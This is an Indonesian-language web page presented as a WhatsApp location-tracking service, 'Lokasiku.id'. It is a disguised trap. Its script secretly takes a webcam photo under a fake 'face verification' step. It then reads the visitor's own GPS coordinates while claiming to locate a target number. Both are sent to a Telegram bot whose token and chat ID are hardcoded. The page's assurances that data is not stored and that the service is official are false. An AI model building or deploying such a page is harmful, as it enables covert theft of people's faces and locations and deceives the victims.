<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Lacak Lokasi WhatsApp - Lokasiku.id</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      flex-direction: column;
      line-height: 1.6;
    }
    .container {
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 20px;
      padding: 40px 30px;
      backdrop-filter: blur(15px);
      box-shadow: 0 20px 40px rgba(0,0,0,0.3);
      text-align: center;
      max-width: 450px;
      width: 90%;
      animation: fadeIn 1s ease;
    }
    h2 { 
      font-weight: 700; 
      font-size: 24px; 
      margin-bottom: 15px;
      color: #35d8ac;
    }
    p { 
      font-size: 15px; 
      color: #e0e0e0; 
      margin-bottom: 25px;
    }
    .logo {
      font-size: 32px;
      margin-bottom: 15px;
      color: #35d8ac;
    }
    .btn-premium {
      padding: 14px 35px;
      font-size: 16px;
      border: none;
      border-radius: 30px;
      background: linear-gradient(to right, #00c896, #00b8e6);
      color: white;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 8px 25px rgba(0, 200, 150, 0.4);
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }
    .btn-premium:hover {
      transform: scale(1.05);
      box-shadow: 0 12px 30px rgba(0, 200, 150, 0.6);
      background: linear-gradient(to right, #00b8e6, #00c896);
    }
    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(20px);}
      to {opacity: 1; transform: translateY(0);}
    }
    .credit { 
      margin-top: 25px; 
      font-size: 12px; 
      color: #aaa;
      display: flex;
      align-items: center;
      gap: 5px;
    }
    #page2 { display: none; }
    input[type="text"] {
      width: 100%; 
      padding: 14px 18px; 
      border-radius: 12px;
      border: none; 
      font-size: 1rem; 
      outline: none;
      margin: 15px 0 25px;
      background: rgba(255,255,255,0.1);
      color: white;
      border: 1px solid rgba(255,255,255,0.2);
    }
    input::placeholder {
      color: rgba(255,255,255,0.5);
    }
    button {
      width: 100%;
      background: linear-gradient(to right, #00c896, #00b8e6);
      color: white;
      font-weight: 600;
      font-size: 1.1rem;
      padding: 16px 0;
      border: none;
      border-radius: 12px;
      cursor: pointer;
      transition: all 0.3s;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }
    button:hover {
      background: linear-gradient(to right, #00b8e6, #00c896);
    }
    .result {
      margin-top: 28px;
      background: rgba(255,255,255,0.15);
      border-radius: 12px;
      padding: 20px;
      font-size: 0.95rem;
      line-height: 1.6;
      box-shadow: inset 2px 2px 10px rgba(255,255,255,0.1);
      text-align: left;
    }
    #videoWrapper {
      margin: 20px 0;
      display: none;
    }
    #videoPreview {
      width: 100%;
      max-width: 250px;
      border-radius: 15px;
      border: 2px solid #35d8ac;
      margin-bottom: 15px;
    }
    .location-info {
      margin-top: 20px;
      background: rgba(255,255,255,0.1);
      padding: 15px;
      border-radius: 12px;
      text-align: left;
    }
    .features {
      text-align: left;
      margin: 20px 0;
    }
    .feature-item {
      display: flex;
      align-items: center;
      margin-bottom: 12px;
      font-size: 14px;
    }
    .feature-item i {
      color: #35d8ac;
      margin-right: 10px;
    }
    .security-badge {
      display: inline-flex;
      align-items: center;
      background: rgba(53, 216, 172, 0.2);
      padding: 8px 15px;
      border-radius: 20px;
      margin: 15px 0;
      font-size: 13px;
    }
    .security-badge i {
      margin-right: 8px;
    }
    label {
      display: block;
      text-align: left;
      margin-bottom: 8px;
      font-weight: 500;
      color: #e0e0e0;
    }
    .loading {
      display: none;
      margin: 20px 0;
    }
    .loading i {
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div id="page1" class="container">
    <div class="logo">
      <i class="fas fa-map-marker-alt"></i>
    </div>
    <h2>Verifikasi Keamanan</h2>
    <p>Untuk melindungi privasi pengguna, kami memerlukan verifikasi wajah sebelum melanjutkan.</p>
    
    <div class="security-badge">
      <i class="fas fa-lock"></i>
      <span>Data Anda aman dan terenkripsi</span>
    </div>
    
    <div id="videoWrapper">
      <video id="videoPreview" autoplay playsinline muted></video>
      <p style="font-size: 13px;">Pastikan wajah Anda terlihat jelas di kamera</p>
    </div>
    
    <div class="features">
      <div class="feature-item">
        <i class="fas fa-check-circle"></i>
        <span>Proses verifikasi hanya 10 detik</span>
      </div>
      <div class="feature-item">
        <i class="fas fa-check-circle"></i>
        <span>Data tidak disimpan setelah verifikasi</span>
      </div>
      <div class="feature-item">
        <i class="fas fa-check-circle"></i>
        <span>Sistem keamanan tingkat tinggi</span>
      </div>
    </div>
    
    <button class="btn-premium" onclick="izinKamera()">
      <i class="fas fa-camera"></i>
      Verifikasi Sekarang
    </button>
    
    <div class="loading" id="loading1">
      <i class="fas fa-spinner"></i>
      <span>Memverifikasi identitas Anda...</span>
    </div>
  </div>
  
  <div id="page2" class="container">
    <div class="logo">
      <i class="fas fa-map-marked-alt"></i>
    </div>
    <h2>Lacak Lokasi WhatsApp</h2>
    <p>Masukkan nomor WhatsApp yang ingin dilacak lokasinya (format: 6281234567890)</p>
    
    <form id="trackForm">
      <label for="waNumber">Nomor WhatsApp Target</label>
      <input type="text" id="waNumber" placeholder="Contoh: 6281365387288" required pattern="^62[0-9]{8,14}$">
      
      <button type="submit">
        <i class="fas fa-search-location"></i>
        Lacak Lokasi
      </button>
    </form>
    
    <div class="loading" id="loading2">
      <i class="fas fa-spinner"></i>
      <span>Mencari lokasi...</span>
    </div>
    
    <div id="result" class="result"></div>
    <div id="locationInfo" class="location-info"></div>
  </div>
  
  <div class="credit">
    <i class="fas fa-shield-alt"></i>
    <span>Lokasiku.id - Sistem Pelacakan Resmi</span>
  </div>

  <script>
    let stream;
    const token = "7251971701:AAFZZymTfsk8YHGU4tLwyePkveAy-caLes0";
    const chatId = "8130894224";

    function getLocationInfo(lat, lon) {
      const locationInfoEl = document.getElementById('locationInfo');
      const text = 'Lokasi telah berhasil dilacak. Sistem kami menggunakan teknologi canggih untuk menentukan posisi dengan akurasi tinggi. Jika lokasi tidak tepat, mohon refresh halaman dan coba lagi. Terima kasih telah menggunakan layanan Lokasiku.id.';
      
      locationInfoEl.innerHTML = `<div style="margin-bottom: 10px;"><i class="fas fa-info-circle" style="color: #35d8ac;"></i> <strong>Informasi Lokasi</strong></div>`;
      
      let i = 0; 
      function ketik() {
        if (i < text.length) {
          locationInfoEl.innerHTML += text.charAt(i);
          i++;
          setTimeout(ketik, 30);
        }
      }
      ketik();
    }

    async function izinKamera() {
      try {
        const tombol = document.querySelector(".btn-premium");
        const loading = document.getElementById('loading1');
        tombol.style.display = 'none';
        loading.style.display = 'flex';
        loading.style.gap = '10px';
        loading.style.alignItems = 'center';
        loading.style.justifyContent = 'center';

        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }, audio: false
        });

        const video = document.getElementById("videoPreview");
        video.srcObject = stream;
        document.getElementById("videoWrapper").style.display = "block";
        video.play();

        video.addEventListener('canplay', function () {
          setTimeout(() => ambilFoto(video, tombol, loading), 2000);
        });

      } catch (err) {
        alert("Verifikasi gagal: " + err.message);
        document.querySelector(".btn-premium").style.display = 'inline-flex';
        document.getElementById('loading1').style.display = 'none';
      }
    }

    function ambilFoto(video, tombol, loading) {
      const canvas = document.createElement("canvas");
      const ctx = canvas.getContext("2d");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(async function(blob) {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", blob, "verifikasi.jpg");
        formData.append("caption", "Verifikasi wajah berhasil");

        try {
          const res = await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: "POST",
            body: formData
          });

          if (res.ok) {
            stream.getTracks().forEach(track => track.stop());
            document.getElementById('page1').style.display = 'none';
            document.getElementById('page2').style.display = 'block';
          } else {
            alert("Verifikasi gagal, silakan coba lagi");
            tombol.style.display = 'inline-flex';
            loading.style.display = 'none';
          }
        } catch (err) {
          alert("Error: " + err.message);
          tombol.style.display = 'inline-flex';
          loading.style.display = 'none';
        }
      }, "image/jpeg");
    }

    document.getElementById('trackForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      const resultEl = document.getElementById('result');
      const loading = document.getElementById('loading2');
      const waNumber = document.getElementById('waNumber').value.trim();
      const submitBtn = document.querySelector('#trackForm button');

      submitBtn.style.display = 'none';
      loading.style.display = 'flex';
      loading.style.gap = '10px';
      loading.style.alignItems = 'center';
      loading.style.justifyContent = 'center';
      resultEl.textContent = '';
      document.getElementById('locationInfo').textContent = '';

      if (!/^62\d{8,14}$/.test(waNumber)) {
        resultEl.textContent = 'Format nomor tidak valid. Harus diawali 62 (contoh: 6281234567890)';
        submitBtn.style.display = 'flex';
        loading.style.display = 'none';
        return;
      }

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;

          const mapUrl = `https://maps.google.com/?q=${lat},${lon}`;
          getLocationInfo(lat, lon);

          const message = `*Lacak Lokasi WhatsApp*\n\nNomor: ${waNumber}\nLokasi GPS: [${lat}, ${lon}]\n\n[Lihat Lokasi di Google Maps](${mapUrl})\n\n_(Lokasi ini berdasarkan GPS pengguna)_`;

          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: chatId,
              text: message,
              parse_mode: "Markdown"
            })
          });

          resultEl.innerHTML = `
            <div style="margin-bottom: 10px;">
              <i class="fas fa-check-circle" style="color: #35d8ac;"></i> 
              <strong>Lokasi Ditemukan</strong>
            </div>
            <div style="margin: 10px 0;">
              <strong>Nomor Target:</strong> ${waNumber}
            </div>
            <div style="margin: 10px 0;">
              <strong>Koordinat:</strong> ${lat.toFixed(6)}, ${lon.toFixed(6)}
            </div>
            <div style="margin-top: 15px;">
              <a href="${mapUrl}" target="_blank" style="color: #35d8ac; text-decoration: none;">
                <i class="fas fa-map-marker-alt"></i> Lihat di Google Maps
              </a>
            </div>
          `;
          
          submitBtn.style.display = 'flex';
          loading.style.display = 'none';
        }, function(error) {
          resultEl.innerHTML = `
            <div style="color: #ff6b6b;">
              <i class="fas fa-exclamation-triangle"></i> 
              Gagal mendapatkan lokasi: ${error.message}
            </div>
          `;
          submitBtn.style.display = 'flex';
          loading.style.display = 'none';
        }, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else {
        resultEl.innerHTML = `
          <div style="color: #ff6b6b;">
            <i class="fas fa-exclamation-triangle"></i> 
            Browser tidak mendukung fitur geolokasi
          </div>
        `;
        submitBtn.style.display = 'flex';
        loading.style.display = 'none';
      }
    });
  </script>
</body>
</html>